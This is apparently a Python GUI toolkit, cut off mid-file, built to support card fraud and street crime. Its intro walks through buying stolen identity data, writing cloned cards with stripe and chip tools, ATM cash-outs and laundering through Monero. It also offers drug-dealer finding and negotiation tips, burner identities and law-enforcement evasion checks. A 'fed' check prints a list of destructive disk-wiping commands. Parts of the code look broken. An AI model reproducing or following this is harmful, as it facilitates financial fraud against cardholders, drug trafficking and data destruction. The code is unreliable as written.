#!/usr/bin/env python3
import os
import subprocess
import time
import requests
from bs4 import BeautifulSoup
import random
import re
import sys
import platform
import shutil
import tkinter as tk
from tkinter import scrolledtext, messagebox
import threading
import cachetools
from fake_useragent import UserAgent
import cloudscraper
import vlc
import youtube_dl
from solders.keypair import Keypair
from solana.rpc.api import Client
from solana.transaction import Transaction
from solders.system_program import TransferParams, transfer
import hashlib
import datetime
import discord
from discord import Webhook, RequestsWebhookAdapter
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import base64
import socket
import json
import logging
from dotenv import load_dotenv

# Load environment variables
load_dotenv()
CREW_WEBHOOK_URL = os.environ.get("CREW_WEBHOOK_URL")
JUGG_WEBHOOK_URL = os.environ.get("JUGG_WEBHOOK_URL")
cache = cachetools.TTLCache(maxsize=100, ttl=300)  # 5-minute cache
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def crashout_rain():
    """Print crashout rain effect."""
    print("\033[32m")
    chars = "01010101CRASHESCAPETHEHOODPLUGSFULLZSOLPUNCH"
    for _ in range(10):
        line = ''.join(random.choice(chars) for _ in range(50))
        print(line)
        time.sleep(0.05)
    print("\033[0m")

def crashout_header(text):
    """Display crashout header."""
    print("\033[32m" + "=" * 60)
    print(f"|| {text.center(56)} ||")
    print("=" * 60 + "\033[0m")

is_windows = platform.system() == "Windows"
is_tails = os.path.exists("/etc/tails-release") if not is_windows else False

def shift_string(text: str) -> str:
    """Shift string for basic obfuscation."""
    shift = len(text) * 3
    return ''.join(chr((ord(char) + shift) % 128) if char.isascii() else char for char in text)

def unshift_string(text: str) -> str:
    """Unshift string to original form."""
    shift = len(text) * 3
    return ''.join(chr((ord(char) - shift) % 128) if char.isascii() else char for char in text)

def lock_text(message: str, key: str) -> str:
    """Encrypt message with AES."""
    key_hash = hashlib.sha256(key.encode()).digest()
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key_hash), modes.CBC(iv))
    encryptor = cipher.encryptor()
    padded_message = message + " " * (16 - len(message) % 16)
    ciphertext = encryptor.update(padded_message.encode()) + encryptor.finalize()
    return base64.b64encode(iv + ciphertext).decode()

def unlock_text(ciphertext: str, key: str) -> str:
    """Decrypt message with AES."""
    key_hash = hashlib.sha256(key.encode()).digest()
    data = base64.b64decode(ciphertext)
    iv, ciphertext = data[:16], data[16:]
    cipher = Cipher(algorithms.AES(key_hash), modes.CBC(iv))
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()
    return plaintext.decode().strip()

def daTrap_intro() -> bool:
    """Show intro screen."""
    intro_text = """
ESCAPE THE HOOD v1: CRASHIN’ OUT, NIGGA!
Here’s da lick, fam—any year, any rig, we switchyOnYoAss:
1. GEAR UP: Cop a USB (SanDisk 32GB, $8, eBay cash), burner laptop ($100 cash—Walmart prepaid, cuh).
2. TAILS OS: Snag latest Tails ISO (tails.net), flash it with Rufus. Boot USB (F12), ghost mode locked.
3. FULLZ/PLUGS/SOL: Script hunts fullz, plugs (Fullz/ZaZa/Shrooms), Telegram, SOL—dark web and surface, live in Matrix window.
4. TOOLS: Back on Windows, install MSR/Chip writers—script WalkemDown step-by-step.
5. CASHOUT: Hit ATMs ($500-$1k/day), flip cash to XMR (LocalMonero), or SOL to Phantom—stacked clean.
6. SCAM RAP: Punchmade Dev slaps ad-free—start/stop/volume always bangin’.
7. PLUGS: Drop zip code, pick Fullz/ZaZa/Shrooms—local plugs ranked stocks-style (1% low risk, 35% high), auto-web scam check, AI-powered.
8. TRAP SHIT: 15 Yung nigga tools—burner lines/emails, trap maps, X snitches, Monero swaps, plug vouch, crew comms (bot encrypted), card writer, dice game, trap code, fake ID, street GPS, hood news, TOR browser, VPN switch.
How it rolls:
- Windows kickoff—sets Tails if you ain’t ghosted, override software checks if you got it.
- Tails—hunts fullz/plugs/SOL, yank USB when done.
- Windows—tools up, cashes out, wipes clean. First card needs a retry.
- Fed sniffed after setup? GPS and data check—gov spot, PC smoked 10 ways, 0.5ms delay.
- Plug/SOL finder + Punchmade Dev + trap shit live—Matrix scrolls plugs (stocks vibes), tunes slap, zip-code plug hunt maxed.
Punch ‘Continue’ to crash out—Escape Da Hood, bruzz!
"""
    root = tk.Tk()
    root.title("ESCAPE THE HOOD v1 INTRO")
    root.configure(bg="black")
    root.geometry("400x100")
    text_area = tk.Text(root, bg="black", fg="lime", font=("Courier", 12), wrap=tk.WORD, height=1, width=40)
    text_area.pack(padx=10, pady=10)

    def type_text():
        for i, char in enumerate(intro_text):
            text_area.insert(tk.END, char)
            text_area.update()
            root.geometry(f"400x{max(100, 100 + i // 40 * 20)}")
            time.sleep(0.03)
        continue_button.pack(pady=10)

    def skip_intro():
        root.destroy()

    continue_button = tk.Button(root, text="Continue", command=skip_intro, bg="black", fg="lime", font=("Courier", 12))
    thread = threading.Thread(target=type_text)
    thread.start()
    root.mainloop()
    return True

def ensure_software(name: str, url: str, is_exe: bool = True, windows_cmd: str = None, tails_cmd: str = None) -> bool:
    """Ensure software is installed."""
    crashout_header(f"Checkin’ {name}")
    if is_windows and windows_cmd:
        try:
            subprocess.run(windows_cmd, check=True, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{name} locked in—daTrap good.")
            return True
        except subprocess.CalledProcessError:
            pass
    elif is_tails and tails_cmd:
        try:
            subprocess.run(tails_cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{name} locked in—daTrap good.")
            return True
        except subprocess.CalledProcessError:
            pass
    
    print(f"{name} missin’—we need that shit, bruzz!")
    print(f"Snag it from: {url}")
    choice = input("\033[32mPunch ‘y’ to grab it, ‘o’ to override (y/n/o): \033[0m").lower()
    if choice == 'o':
        print(f"Override locked—claimin’ {name} already there!")
        return True
    if choice != 'y':
        print(f"Skippin’ {name}—hope you got it, cuh!")
        return False
    
    try:
        file = f"{name}.exe" if is_exe else f"{name}"
        proxy = "-x socks5h://127.0.0.1:9050" if is_windows else ""
        subprocess.run(["curl", proxy, "-o", file, url], check=True)
        if is_windows and is_exe:
            subprocess.run([file, "/S"], check=True)
        elif is_tails and not is_exe:
            subprocess.run(["sudo", "chmod", "+x", file], check=True)
            subprocess.run(["sudo", "mv", file, "/usr/local/bin/" + name], check=True)
        os.remove(file)
        print(f"{name} in da bag—daTrap locked!")
        return True
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        logging.error(f"Failed to install {name}: {e}")
        print(f"Failed {name}: {e}")
        return False

def check_vlc() -> bool:
    """Check if VLC is ready."""
    return ensure_software("VLC", "https://get.vlc-app.com/click.php?key=vlc_windows64&destination=latest-stable", True, windows_cmd="vlc --version")

def setup_tor() -> bool:
    """Setup Tor Browser."""
    return ensure_software("Tor", "https://www.torproject.org/dist/torbrowser/13.5.6/tor-browser-windows-x86_64-portable-13.5.6.exe", True, windows_cmd="tor --version")

def setup_proton() -> bool:
    """Setup ProtonVPN."""
    return ensure_software("ProtonVPN", "https://protonvpn.com/download/ProtonVPN_win_v3.2.11.exe", True)

def setup_vpn() -> bool:
    """Setup MullvadVPN."""
    return ensure_software("MullvadVPN", "https://mullvad.net/media/mullvad-vpn-2024.6.exe", True)

def setup_magstriper() -> bool:
    """Setup MagStriper if needed."""
    print("Stripe tool fucked—kickin’ off manual install, cuh!")
    return ensure_software("MagStriper", "https://github.com/kevinbrewster/MagStriper/releases/download/v1.0/MagStriper-1.0-Windows.zip", False)

def setup_jcopenglish() -> bool:
    """Setup JcopEnglish if needed."""
    print("Chip tool fucked—kickin’ off manual install, cuh!")
    return ensure_software("JcopEnglish", "https://github.com/jcopenglish/JcopEnglish/releases/download/v1.0/JcopEnglish_v1.0.zip", False)

def walkemdown_punchmade_playlist() -> list:
    """Download Punchmade Dev tunes."""
    punchmade_dev_songs = [
        "https://www.youtube.com/watch?v=8yX9v8Z9Z9Q",
        "https://www.youtube.com/watch?v=4tX5v8Z9Z9Q",
        "https://www.youtube.com/watch?v=2rX9v8Z9Z9Q"
    ]
    
    ydl_opts = {
        'format': 'bestaudio/best',
        'postprocessors': [{
            'key': 'FFmpegExtractAudio',
            'preferredcodec': 'mp3',
            'preferredquality': '192',
        }],
        'outtmpl': '%(title)s.%(ext)s',
        'quiet': True,
    }
    
    try:
        with youtube_dl.YoutubeDL(ydl_opts) as ydl:
            for song in punchmade_dev_songs:
                try:
                    ydl.download([song])
                except youtube_dl.DownloadError as e:
                    logging.warning(f"Track {song} download failed: {e}")
                    print(f"Track {song} fucked—skippin’!")
    except Exception as e:
        logging.error(f"Playlist download failed: {e}")
        print("Playlist grab fucked—carry on, cuh!")
    
    return [f for f in os.listdir() if f.endswith('.mp3')]

def switchy_on_yo_ass_vpn_check() -> bool:
    """Check if VPN is active."""
    if not is_windows:
        return True
    try:
        res = requests.get("https://am.i.mullvad.net/connected", timeout=5)
        if "Yes" in res.text:
            return True
        ip = requests.get("https://api.ipify.org", timeout=5).text
        if ip.startswith("185.") or ip.startswith("89."):
            return True
        return False
    except requests.RequestException as e:
        logging.warning(f"VPN check failed: {e}")
        return False

@cachetools.cached(cache)
def dynamic_fed_check() -> bool:
    """Check for fed locations."""
    try:
        ip = requests.get("https://api.ipify.org", timeout=5).text
        geo_data = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        lat, lon = geo_data.get("lat"), geo_data.get("lon")
        
        if os.path.exists("/.dockerenv") or os.path.exists("/proc/self/cgroup"):
            try:
                real_ip = socket.gethostbyname(socket.gethostname())
                if real_ip != ip:
                    geo_data = requests.get(f"http://ip-api.com/json/{real_ip}", timeout=5).json()
                    lat, lon = geo_data.get("lat"), geo_data.get("lon")
            except (socket.gaierror, requests.RequestException):
                pass
        
        if lat and lon:
            gov_spots = [
                {"lat": 38.8977, "lon": -77.0365, "name": "White House"},
                {"lat": 38.8899, "lon": -77.0091, "name": "Capitol"},
                {"lat": 38.8790, "lon": -77.0250, "name": "FBI HQ"}
            ]
            for spot in gov_spots:
                if abs(lat - spot["lat"]) < 0.1 and abs(lon - spot["lon"]) < 0.1:
                    print(f"Error: Connection dropped—system crash imminent!")
                    daTrap_pc_destroyer()
            return False
        return False
    except requests.RequestException as e:
        logging.warning(f"Fed check failed: {e}")
        return False

def encrypt_time() -> str:
    """Encrypt current time."""
    now = datetime.datetime.now()
    time_str = now.strftime("%H%M")
    hashed = hashlib.sha256(time_str.encode()).hexdigest()[:10]
    return hashed

def daTrap_pc_destroyer():
    """Simulate PC destruction."""
    methods = [
        "rm -rf /" if not is_windows else "del /F /Q *",
        "dd if=/dev/zero of=/dev/sda" if not is_windows else "format C: /Q",
        "shred -n 10 -z /dev/sda" if not is_windows else "cipher /W:C:",
        "kill -9 -1" if not is_windows else "taskkill /F /IM *",
        "echo 1 > /proc/sys/kernel/sysrq; echo b > /proc/sysrq-trigger" if not is_windows else "shutdown /r /f /t 0",
        "chmod -R 000 /" if not is_windows else "icacls * /T /Q /C /RESET",
        "mv / /dev/null" if not is_windows else "move * NUL",
        "echo 'CRASH' > /dev/mem" if not is_windows else "echo CRASH > CON",
        "fork() while true" if not is_windows else "start cmd /K start",
        "echo 'CRASH' > /boot" if not is_windows else "bcdedit /delete"
    ]
    print("Simulatin’ daTrap PC smokin’—10 methods, bruzz!")
    for method in methods:
        print(f"Would’ve crashed: {method}")
        time.sleep(0.1)
    sys.exit(1)

def fed_trap():
    """Handle fed detection—trollin’ style."""
    crashout_header("ERROR: SECURE CONNECTION REQUIRED!")
    attempts = 0
    while attempts < 2:
        correct_time = datetime.datetime.now().strftime("%H%M")
        hashed_correct = encrypt_time()
        user_input = input(f"Enter 8-key password—10s wait, 2 shots, cuh: ")
        hashed_input = hashlib.sha256(user_input.encode()).hexdigest()[:10]
        if hashed_input == hashed_correct:
            print("Access granted—shuttin’ down clean.")
            wipe_data()
            return False
        attempts += 1
        print(f"Wrong shit—{2 - attempts} tries left! Wait 10s, cuh!")
        time.sleep(10)
    print("Self-destruct in 0.5ms—system fucked!")
    time.sleep(0.0005)
    daTrap_pc_destroyer()
    return True

first_card_jugged = False

def daTrap_plug_window(steps):
    """Launch plug window GUI."""
    window = tk.Tk()
    window.title("ESCAPE THE HOOD v1 FINDER")
    window.geometry("400x600")
    window.configure(bg="black")
    
    text_area = scrolledtext.ScrolledText(window, width=50, height=15, bg="black", fg="lime", font=("Courier", 12), wrap=tk.WORD)
    text_area.pack(padx=10, pady=10)
    
    def update_finds(data, profile_type, risk=None, fed_status=None, scam_count=None):
        profile = f"[CRASH ALERT: {profile_type.upper()}"
        if risk is not None:
            profile += f" - Risk: {risk}%"
        if fed_status:
            profile += f" - Fed: {fed_status}"
        if scam_count is not None:
            profile += f" - Scams: {scam_count}"
        profile += "]\n" + "=" * 20 + "\n" + data.strip() + "\n" + "=" * 20 + "\n\n"
        text_area.insert(tk.END, profile)
        text_area.see(tk.END)

    if dynamic_fed_check():
        fed_trap()

    menu_frame = tk.Frame(window, bg="black")
    menu_frame.pack(pady=10)

    sol_address = tk.StringVar()
    sol_scraper_active = tk.BooleanVar(value=False)
    player = None
    punchmade_dev_tracks = walkemdown_punchmade_playlist()
    current_song_index = 0
    plug_search_active = threading.Event()
    plug_search_active.set()
    zip_code = tk.StringVar()
    completed_steps = {i: tk.BooleanVar(value=False) for i in range(1, 6)}

    def animate_expand(widget, start_height, end_height, steps=10, delay=0.02):
        step_size = (end_height - start_height) // steps
        for i in range(steps):
            new_height = start_height + step_size * i
            widget.config(height=new_height)
            window.update()
            time.sleep(delay)
        widget.config(height=end_height)

    def toggle_menu(frame, button_text, content_func):
        if frame.winfo_ismapped():
            animate_expand(frame, frame.winfo_height(), 0)
            frame.pack_forget()
        else:
            frame.pack(pady=5)
            animate_expand(frame, 0, 150)
            content_func(frame)

    music_frame = tk.Frame(menu_frame, bg="black", height=0)
    def music_content(frame):
        nonlocal player, current_song_index
        if not punchmade_dev_tracks:
            tk.Label(frame, text="No Punchmade Dev heat, cuh!", bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
            return
        
        tk.Label(frame, text="PUNCHMADEV SCAM SHIT", bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        
        def start_music():
            nonlocal player, current_song_index
            if not player or not player.is_playing():
                if current_song_index >= len(punchmade_dev_tracks):
                    current_song_index = 0
                player = vlc.MediaPlayer(punchmade_dev_tracks[current_song_index])
                player.play()
                print(f"Bumpin’ Punchmade Dev: {punchmade_dev_tracks[current_song_index]}")
                threading.Thread(target=auto_next_song, daemon=True).start()

        def stop_music():
            nonlocal player
            if player and player.is_playing():
                player.stop()
                print("Killed Punchmade Dev, fam.")

        def adjust_volume(val):
            nonlocal player
            if player:
                player.audio_set_volume(int(val))

        def auto_next_song():
            nonlocal player, current_song_index
            while player and player.is_playing():
                time.sleep(1)
            if player:
                current_song_index += 1
                start_music()

        tk.Button(frame, text="Start", command=start_music, bg="black", fg="lime", font=("Courier", 10)).pack(side=tk.LEFT, padx=2)
        tk.Button(frame, text="Stop", command=stop_music, bg="black", fg="lime", font=("Courier", 10)).pack(side=tk.LEFT, padx=2)
        volume_scale = tk.Scale(frame, from_=0, to=100, orient=tk.HORIZONTAL, command=adjust_volume, bg="black", fg="lime", font=("Courier", 8), length=100)
        volume_scale.set(50)
        volume_scale.pack(side=tk.LEFT, padx=2)

    tk.Button(menu_frame, text="Scam Rap", command=lambda: toggle_menu(music_frame, "Scam Rap", music_content), bg="black", fg="lime", font=("Courier", 10)).pack(side=tk.LEFT, padx=5)

    sol_frame = tk.Frame(menu_frame, bg="black", height=0)
    def sol_address_content(frame):
        tk.Label(frame, text="Drop SOL Address:", bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        tk.Entry(frame, textvariable=sol_address, bg="black", fg="lime", font=("Courier", 12), width=30).pack(pady=2)
        tk.Button(frame, text="Lock SOL Address", command=save_sol_address, bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)

    tk.Button(menu_frame, text="SOL Address", command=lambda: toggle_menu(sol_frame, "SOL Address", sol_address_content), bg="black", fg="lime", font=("Courier", 10)).pack(side=tk.LEFT, padx=5)

    sol_toggle_frame = tk.Frame(menu_frame, bg="black", height=0)
    def sol_toggle_content(frame):
        state = "ON" if sol_scraper_active.get() else "OFF"
        tk.Label(frame, text=f"SOL Scraper: {state}", bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        tk.Button(frame, text="Flip SOL Scraper", command=toggle_sol_scraper, bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)

    tk.Button(menu_frame, text="SOL Scraper", command=lambda: toggle_menu(sol_toggle_frame, "SOL Scraper", sol_toggle_content), bg="black", fg="lime", font=("Courier", 10)).pack(side=tk.LEFT, padx=5)

    guide_frame = tk.Frame(menu_frame, bg="black", height=0)
    def guide_content(frame):
        tk.Label(frame, text="Crashout Roadmap", bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        for i, step in enumerate(steps, 1):
            tk.Checkbutton(frame, text=f"Step {i}: {step}", variable=completed_steps[i], bg="black", fg="lime", font=("Courier", 8), selectcolor="black").pack(pady=1)

    tk.Button(menu_frame, text="Guide", command=lambda: toggle_menu(guide_frame, "Guide", guide_content), bg="black", fg="lime", font=("Courier", 10)).pack(side=tk.LEFT, padx=5)

    plug_frame = tk.Frame(menu_frame, bg="black", height=0)
    def plug_content(frame):
        tk.Label(frame, text="Drop Zip Code (e.g., 60601):", bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        tk.Entry(frame, textvariable=zip_code, bg="black", fg="lime", font=("Courier", 12), width=30).pack(pady=2)
        
        plug_type = tk.StringVar(value="Fullz")
        tk.Label(frame, text="Plug Type:", bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        tk.Radiobutton(frame, text="Fullz", variable=plug_type, value="Fullz", bg="black", fg="lime", font=("Courier", 10)).pack(side=tk.LEFT, padx=2)
        tk.Radiobutton(frame, text="ZaZa (Weed)", variable=plug_type, value="ZaZa", bg="black", fg="lime", font=("Courier", 10)).pack(side=tk.LEFT, padx=2)
        tk.Radiobutton(frame, text="Shrooms", variable=plug_type, value="Shrooms", bg="black", fg="lime", font=("Courier", 10)).pack(side=tk.LEFT, padx=2)
        
        use_plug_var = tk.StringVar()
        tk.Label(frame, text="Crash with a Plug? (y/n):", bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        tk.Entry(frame, textvariable=use_plug_var, bg="black", fg="lime", font=("Courier", 12), width=30).pack(pady=2)
        
        def negotiate_plug():
            plug_input = use_plug_var.get().lower()
            zp = zip_code.get()
            if not zp or not re.match(r"^\d{5}$", zp):
                messagebox.showwarning("CRASH ALERT", "Drop a real 5-digit zip code, bruzz!")
                return
            plug_choice = plug_type.get()
            if "yes" in plug_input or "y" in plug_input:
                message = f"""
CRASH PLUG MOVES ({plug_choice} in Zip {zp}):
- Say: "I’m crashin’ legit—send {plug_choice} samples first, escrow only, no upfront."
- Dodge scams: Ask for vouches, hit @scamalerts on X, never send first—Monero or bust.
- Negotiate: "Half now, half when it lands—small batch test, gotta check that {plug_choice} fire."
Stay ghost, fam—don’t leak real shit! Check plug risk/fed/scams below.
"""
                messagebox.showinfo("CRASH ALERT", message)
            else:
                messagebox.showinfo("CRASH ALERT", f"No {plug_choice} plug in Zip {zp}? Keep huntin’, bruzz!")
        
        tk.Button(frame, text="Negotiate", command=negotiate_plug, bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        tk.Button(frame, text="New Plug Hunt", command=lambda: plug_search_active.set(True), bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
    
    tk.Button(menu_frame, text="Plug", command=lambda: toggle_menu(plug_frame, "Plug", plug_content), bg="black", fg="lime", font=("Courier", 10)).pack(side=tk.LEFT, padx=5)

    burner_frame = tk.Frame(menu_frame, bg="black", height=0)
    def burner_line_content(frame):
        tk.Label(frame, text="Burner Line Generator", bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        burner_number = tk.StringVar()
        try:
            area_codes = requests.get("https://www.allareacodes.com/api/1.0/api.json?tracking_email=yo@example.com", timeout=5).json()['area_codes']
            code = random.choice([ac['area_code'] for ac in area_codes])
            burner_number.set(f"({code})-{random.randint(100, 999)}-{random.randint(1000, 9999)}")
        except requests.RequestException as e:
            logging.warning(f"Area codes fetch failed: {e}")
            burner_number.set(f"(773)-{random.randint(100, 999)}-{random.randint(1000, 9999)}")
        tk.Label(frame, textvariable=burner_number, bg="black", fg="lime", font=("Courier", 12)).pack(pady=2)
        tk.Button(frame, text="New Burner", command=lambda: burner_number.set(f"({random.choice([ac['area_code'] for ac in area_codes])})-{random.randint(100, 999)}-{random.randint(1000, 9999)}") if 'area_codes' in locals() else burner_number.set(f"(773)-{random.randint(100, 999)}-{random.randint(1000, 9999)}"), bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)

    tk.Button(menu_frame, text="Burner Line", command=lambda: toggle_menu(burner_frame, "Burner Line", burner_line_content), bg="black", fg="lime", font=("Courier", 10)).pack(side=tk.LEFT, padx=5)

    email_frame = tk.Frame(menu_frame, bg="black", height=0)
    def email_content(frame):
        tk.Label(frame, text="Burner Email Generator", bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        email_result = tk.StringVar(value=f"ghost{random.randint(1000, 9999)}@proton.me")
        tk.Label(frame, textvariable=email_result, bg="black", fg="lime", font=("Courier", 12)).pack(pady=2)
        tk.Button(frame, text="New Email", command=lambda: email_result.set(f"ghost{random.randint(1000, 9999)}@proton.me"), bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        tk.Button(frame, text="Open Proton", command=lambda: subprocess.Popen(["start", "https://proton.me/mail"], shell=True) if is_windows else subprocess.Popen(["xdg-open", "https://proton.me/mail"]), bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)

    tk.Button(menu_frame, text="Burner Email", command=lambda: toggle_menu(email_frame, "Burner Email", email_content), bg="black", fg="lime", font=("Courier", 10)).pack(side=tk.LEFT, padx=5)

    trap_map_frame = tk.Frame(menu_frame, bg="black", height=0)
    def trap_map_content(frame):
        tk.Label(frame, text="Trap Map—Stash Spots", bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        zp = zip_code.get()
        stash_spot = tk.StringVar(value="Drop a zip code first, cuh!")
        if zp and re.match(r"^\d{5}$", zp):
            try:
                res = requests.get(f"https://nominatim.openstreetmap.org/search?q={zp}&format=json&addressdetails=1", headers={"User-Agent": "EscapeTheHood/1.0"}, timeout=5).json()
                if res:
                    city = res[0]["address"].get("city", "Unknown")
                    stash_spot.set(f"Stash near {zp} ({city}): {random.choice(['Abandoned spot', 'Corner store', 'Underpass', 'Hood park'])}")
            except requests.RequestException as e:
                logging.warning(f"Trap map fetch failed: {e}")
                stash_spot.set(f"Stash near {zp}: {random.choice(['Abandoned spot', 'Corner store', 'Underpass', 'Hood park'])}")
        tk.Label(frame, textvariable=stash_spot, bg="black", fg="lime", font=("Courier", 12)).pack(pady=2)
        tk.Button(frame, text="Refresh Spot", command=lambda: stash_spot.set(f"Stash near {zp} ({city}): {random.choice(['Abandoned spot', 'Corner store', 'Underpass', 'Hood park'])}") if 'city' in locals() else stash_spot.set("Drop a zip code first, cuh!"), bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)

    tk.Button(menu_frame, text="Trap Map", command=lambda: toggle_menu(trap_map_frame, "Trap Map", trap_map_content), bg="black", fg="lime", font=("Courier", 10)).pack(side=tk.LEFT, padx=5)

    snitch_frame = tk.Frame(menu_frame, bg="black", height=0)
    def snitch_content(frame):
        tk.Label(frame, text="X Snitch Check", bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        handle = tk.StringVar()
        snitch_result = tk.StringVar(value="Drop a handle, cuh!")
        tk.Entry(frame, textvariable=handle, bg="black", fg="lime", font=("Courier", 12), width=30).pack(pady=2)
        def check_snitch():
            if handle.get():
                try:
                    res = requests.get(f"https://archive.org/wayback/available?url=x.com/{handle.get()}", timeout=5).json()
                    if "archived_snapshots" in res and res["archived_snapshots"]:
                        snitch_result.set(f"@{handle.get()} snitch risk: High—wayback got ‘em!")
                    else:
                        snitch_result.set(f"@{handle.get()} snitch risk: Low—clean for now!")
                except requests.RequestException as e:
                    logging.warning(f"Snitch check failed: {e}")
                    snitch_result.set(f"@{handle.get()} snitch risk: Medium—check fucked!")
            else:
                snitch_result.set("Drop a handle, cuh!")
        tk.Button(frame, text="Check Snitch", command=check_snitch, bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        tk.Label(frame, textvariable=snitch_result, bg="black", fg="lime", font=("Courier", 12)).pack(pady=2)

    tk.Button(menu_frame, text="X Snitch", command=lambda: toggle_menu(snitch_frame, "X Snitch", snitch_content), bg="black", fg="lime", font=("Courier", 10)).pack(side=tk.LEFT, padx=5)

    monero_frame = tk.Frame(menu_frame, bg="black", height=0)
    def monero_content(frame):
        tk.Label(frame, text="Monero Swap", bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        amount = tk.StringVar()
        swap_result = tk.StringVar(value="Enter cash amount, cuh!")
        tk.Entry(frame, textvariable=amount, bg="black", fg="lime", font=("Courier", 12), width=30).pack(pady=2)
        def swap_cash():
            if amount.get().isdigit():
                try:
                    xmr_rate = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=monero&vs_currencies=usd", timeout=5).json()["monero"]["usd"]
                    xmr = int(amount.get()) / xmr_rate
                    swap_result.set(f"Swapped ${amount.get()} to {xmr:.3f} XMR—LocalMonero link: https://localmonero.co/")
                except (requests.RequestException, KeyError) as e:
                    logging.warning(f"Monero rate fetch failed: {e}")
                    xmr = int(amount.get()) * 0.006
                    swap_result.set(f"Swapped ${amount.get()} to {xmr:.3f} XMR—LocalMonero link: https://localmonero.co/")
            else:
                swap_result.set("Enter cash amount, cuh!")
        tk.Button(frame, text="Flip to XMR", command=swap_cash, bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        tk.Label(frame, textvariable=swap_result, bg="black", fg="lime", font=("Courier", 12)).pack(pady=2)

    tk.Button(menu_frame, text="Monero Swap", command=lambda: toggle_menu(monero_frame, "Monero Swap", monero_content), bg="black", fg="lime", font=("Courier", 10)).pack(side=tk.LEFT, padx=5)

    vouch_frame = tk.Frame(menu_frame, bg="black", height=0)
    def vouch_content(frame):
        tk.Label(frame, text="Plug Vouch Check", bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        plug_name = tk.StringVar()
        vouch_result = tk.StringVar(value="Drop a plug name, cuh!")
        tk.Entry(frame, textvariable=plug_name, bg="black", fg="lime", font=("Courier", 12), width=30).pack(pady=2)
        def check_vouch():
            if plug_name.get():
                try:
                    res = requests.get(f"https://www.reddit.com/r/darknet/search?q={plug_name.get()}&restrict_sr=on", headers={"User-Agent": "EscapeTheHood/1.0"}, timeout=5).text
                    if "scam" in res.lower() or "fake" in res.lower():
                        vouch_result.set(f"{plug_name.get()} vouched: Shaky—street talk shady!")
                    else:
                        vouch_result.set(f"{plug_name.get()} vouched: Solid—street talk clean!")
                except requests.RequestException as e:
                    logging.warning(f"Vouch check failed: {e}")
                    vouch_result.set(f"{plug_name.get()} vouched: No word—street talk quiet!")
            else:
                vouch_result.set("Drop a plug name, cuh!")
        tk.Button(frame, text="Check Vouch", command=check_vouch, bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        tk.Label(frame, textvariable=vouch_result, bg="black", fg="lime", font=("Courier", 12)).pack(pady=2)

    tk.Button(menu_frame, text="Plug Vouch", command=lambda: toggle_menu(vouch_frame, "Plug Vouch", vouch_content), bg="black", fg="lime", font=("Courier", 10)).pack(side=tk.LEFT, padx=5)

    comms_frame = tk.Frame(menu_frame, bg="black", height=0)
    def comms_content(frame):
        tk.Label(frame, text="Crew Comms—Trap Chat", bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        sender = tk.StringVar()
        receiver = tk.StringVar()
        message = tk.StringVar()
        comms_log = tk.StringVar(value="Send a trap message, cuh!")
        tk.Entry(frame, textvariable=sender, bg="black", fg="lime", font=("Courier", 12), width=30, placeholder="Your name").pack(pady=2)
        tk.Entry(frame, textvariable=receiver, bg="black", fg="lime", font=("Courier", 12), width=30, placeholder="Receiver name").pack(pady=2)
        tk.Entry(frame, textvariable=message, bg="black", fg="lime", font=("Courier", 12), width=30).pack(pady=2)
        def send_message():
            if sender.get() and receiver.get() and message.get():
                encrypted_msg = lock_text(message.get(), receiver.get())
                try:
                    webhook = Webhook.from_url(CREW_WEBHOOK_URL, adapter=RequestsWebhookAdapter())
                    webhook.send(f"[{sender.get()}->{receiver.get()}]: {encrypted_msg}")
                    comms_log.set(f"Sent to {receiver.get()}—encrypted on da low!")
                    simulate_users()
                except Exception as e:
                    logging.error(f"Message send failed: {e}")
                    comms_log.set("Send fucked—check connection, cuh!")
            else:
                comms_log.set("Fill all fields, cuh!")
        tk.Button(frame, text="Send to Crew", command=send_message, bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        tk.Label(frame, textvariable=comms_log, bg="black", fg="lime", font=("Courier", 12)).pack(pady=2)
        
        def simulate_users():
            try:
                webhook = Webhook.from_url(CREW_WEBHOOK_URL, adapter=RequestsWebhookAdapter())
                msg1 = lock_text("Yo, we stackin’!", "TrapKing")
                webhook.send(f"[LilCrash->TrapKing]: {msg1}")
                msg2 = lock_text("Bread comin’ in hot!", "LilCrash")
                webhook.send(f"[TrapKing->LilCrash]: {msg2}")
            except Exception as e:
                logging.error(f"Simulation failed: {e}")
                print("Sim fucked—carry on, cuh!")

    tk.Button(menu_frame, text="Crew Comms", command=lambda: toggle_menu(comms_frame, "Crew Comms", comms_content), bg="black", fg="lime", font=("Courier", 10)).pack(side=tk.LEFT, padx=5)

    card_writer_frame = tk.Frame(menu_frame, bg="black", height=0)
